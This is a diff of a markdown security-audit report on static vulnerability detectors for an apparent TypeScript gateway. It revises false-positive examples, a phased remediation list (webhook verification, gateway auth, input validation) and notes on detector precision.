-| **FP-INTERFACE** | Function is a safe wrapper/facade, no actual risk | `refreshOAuthTokenWithLock` with correct expiration checks |
-| **FP-LAYERS** | Function is protected by upstream validation | `parseIcaclsOutput` parses system command output, not user input |
-| **FP-STRUCTURAL** | Complexity comes from exhaustive safe handling | `spawnGogServe` uses array-form spawn, config-driven |
-| **FP-TRIVIAL** | Function is too simple or display-only to contain meaningful bugs | `logGatewayStartup` only logs config to console |
-
-## Triage Workflow
-
-### Phase 1: Critical Webhook Verification (TASK-001, 002, 003)
-1. **TASK-001**: Enforce `allowedHosts` by default in `reconstructWebhookUrl` — reject forwarding headers unless explicitly configured
-2. **TASK-007**: Add `NODE_ENV === "production"` guard to `skipVerification` in both Twilio and Plivo verifiers
-3. **TASK-002**: Remove or restrict ngrok loopback bypass to require additional explicit opt-in
-4. Verify that `timingSafeEqualString` is used consistently across all HMAC comparisons
-
-### Phase 2: Critical Gateway Auth (TASK-004, 005)
-1. **TASK-009**: Prevent `client.id` spoofing — `dangerouslyDisableDeviceAuth` should not rely on self-reported client ID
-2. **TASK-004**: Remove legacy v1 signature fallback or add deprecation timeline
-3. **TASK-010**: Refactor `authorizeGatewayMethod` to single method-to-scope lookup table
-
-### Phase 3: High Priority (TASK-011 through TASK-018)
-1. **TASK-013/021**: Validate URLs, paths, and package names in `parseInstallSpec` — highest impact in this tier
-2. **TASK-018**: Audit `fetchWithSsrFGuard()` for DNS rebinding resistance
-3. **TASK-016**: Document Tailscale auth priority ordering in `authorizeGatewayConnect`
-4. **TASK-011**: Audit callers of `splitShellArgs` to ensure no user input reaches it unsanitized
-5. **TASK-012**: Add alphanumeric validation to Signal daemon account parameter
-
-### Phase 4: Medium Priority (TASK-015, 017, 019, 020)
-1. **TASK-015**: Verify config path validation in downstream config system
-2. **TASK-019**: Verify `sanitizeUserFacingText()` covers prompt injection and HTML entities
-3. **TASK-020**: Verify `openFileWithinRoot` handles TOCTOU correctly
-4. **TASK-017**: Document auth fallback security tradeoff; validate full redirect chain
+| **FP-INTERFACE** | Function is a safe wrapper/facade, no actual risk | `routeReply` delegates to `deliverOutboundPayloads` |
+| **FP-LAYERS** | Function is protected by upstream validation | `listAgentFiles` uses constant ALLOWED_FILE_NAMES |
+| **FP-STRUCTURAL** | Complexity comes from exhaustive safe handling | `parseMessageWithAttachments` with comprehensive base64/size/MIME validation |
+| **FP-TRIVIAL** | Function is too simple or display-only to contain meaningful bugs | `formatGatewayAuthFailureMessage` formats pre-determined error messages |
 
 ## Technical Notes
 
 - **No call graph**: RETER TypeScript indexing does not produce call graph edges, so detectors rely on node-local predicates (function name, file path, line count)
-- **Name-based heuristics**: Detectors use REGEX on function names and file paths as proxies for behavior — some FPs are expected (15% overall TP rate is typical for static heuristic detectors)
-- **Complexity proxy**: Line count is used as a proxy for cyclomatic complexity — higher line counts correlate with more branches and edge cases
-- **Tunable thresholds**: All detectors accept `min_lines` and `limit` parameters for customization
-- **Detector precision by tier**: Critical detectors (webhook_verification_bypass: 100% TP) are far more precise than broad detectors (auth_handler_complexity: 6% TP) — this is expected since narrow file/name patterns produce fewer false positives
-- **Root cause chains**: TASK-002 and TASK-003 both depend on TASK-001 (`reconstructWebhookUrl`) as root cause — fixing TASK-001 partially mitigates both downstream verifiers
+- **Name-based heuristics**: Detectors use REGEX on function names and file paths as proxies for behavior — FPs are expected (8% overall TP rate)
+- **Complexity proxy**: Line count is used as a proxy for cyclomatic complexity
+- **Tunable thresholds**: All detectors accept `min_lines` and `limit` parameters
+- **Detector precision by tier**: `webhook_verification_bypass` (86% TP) is the most precise detector; broad detectors like `complex_input_parsers` (4% TP) have high FP rates
+- **Root cause chains**: TASK-001 and TASK-002 both depend on TASK-005 (`reconstructWebhookUrl`) as root cause — fixing TASK-005 partially mitigates both verifiers
+- **v2 improvements**: Fresh source code verification with 4 parallel Explore agents. More conservative classification resulted in 4 downgrades and 4 new findings. Net: higher confidence in remaining TPs.
